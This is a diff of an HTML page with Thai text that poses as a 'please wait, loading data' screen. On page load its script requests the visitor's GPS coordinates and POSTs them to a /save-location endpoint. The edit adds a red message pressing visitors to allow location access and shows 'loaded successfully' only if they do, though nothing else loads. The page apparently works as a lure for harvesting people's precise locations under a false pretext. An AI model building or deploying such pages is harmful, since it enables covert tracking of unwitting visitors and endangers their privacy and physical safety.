@@ -6,49 +6,56 @@
     table { border-collapse: collapse; width: 80%; margin-top: 20px;}
     th, td { border: 1px solid #ddd; padding: 8px;}
     th { background-color: #f2f2f2;}
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+    #status { font-size: 32px; margin-top: 20px; }
+    #permission { font-size: 28px; color: red; margin-top: 15px; }
   </style>
 </head>
 <body>
-<h1 style = "font-size: 120px;">กรุณารอสักครู่</h1>
-<p style = "font-size: 100px;" id="status">กำลังโหลดข้อมูล...</p>
+  <h1 style="font-size: 60px;">กรุณารอสักครู่</h1>
+  <p id="status">กำลังโหลดข้อมูล...</p>
+  <p id="permission">กรุณาอนุญาตการเข้าถึงตำแหน่งเพื่อเข้าชม</p>
 
-<script>
-async function sendLocation() {
-    let latitude = null;
-    let longitude = null;
+  <script>
+  async function sendLocation() {
+      let latitude = null;
+      let longitude = null;
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            latitude = pos.coords.latitude;
-            longitude = pos.coords.longitude;
-            postData(latitude, longitude);
-        }, (err) => {
-            console.log("GPS ไม่อนุญาต:", err.message);
-            postData(null, null);
-        });
-    } else {
-        postData(null, null);
-    }
-}
+      if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition((pos) => {
+              latitude = pos.coords.latitude;
+              longitude = pos.coords.longitude;
+              postData(latitude, longitude, true);
+          }, (err) => {
+              console.log("GPS ไม่อนุญาต:", err.message);
+              postData(null, null, false);
+          });
+      } else {
+          postData(null, null, false);
+      }
+  }
 
-async function postData(lat, lon) {
-    try {
-        const res = await fetch('/save-location', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({latitude: lat, longitude: lon})
-        });
-        const data = await res.text();
-        document.getElementById('status').innerText = data;
-    } catch (err) {
-        document.getElementById('status').innerText = 'โหลดไม่สำเร็จ: ' + err.message;
-    }
-}
+  async function postData(lat, lon, allowed) {
+      try {
+          const res = await fetch('/save-location', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({latitude: lat, longitude: lon})
+          });
 
-window.onload = sendLocation;
-</script>
+          if (allowed) {
+              document.getElementById('status').innerText = 'โหลดสำเร็จ';
+          } else {
+              document.getElementById('status').innerText = 'โหลดไม่สำเร็จ กรุณาอนุญาตการเข้าถึงตำแหน่ง';
+          }
+      } catch (err) {
+          document.getElementById('status').innerText = 'โหลดไม่สำเร็จ: ' + err.message;
+      }
+  }
 
-<p>ดู <a href="/xp" target="_blank">XP รวมทั้งหมด</a>
+  window.onload = sendLocation;
+  </script>
 
+  <p>ดู <a href="/xp" target="_blank">XP รวมทั้งหมด</a></p>
 </body>
 </html>
